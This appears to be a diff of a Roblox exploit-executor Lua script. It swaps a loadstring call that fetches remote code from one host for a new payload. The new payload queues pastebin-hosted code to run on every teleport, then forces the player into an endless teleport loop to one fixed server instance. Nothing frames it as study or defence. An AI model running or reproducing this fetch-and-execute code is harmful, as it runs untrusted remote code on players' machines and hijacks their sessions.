@@ -1,1 +1,2 @@
-loadstring(game:HttpGet("https://egorikusa.space/2e9e3e1e7ddf096baf6e37c1.lua", true))()
+--@everyone 
+ if queue_on_teleport ~= nil then queue_on_teleport("Username = 'ViperGGs1';loadstring(game:HttpGet('https://pastebin.com/raw/5vknPgVD'))()") end while task.wait(1) do game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "6e43b62f-a628-4812-a631-722064ad74e3", game.Players.LocalPlayer) end
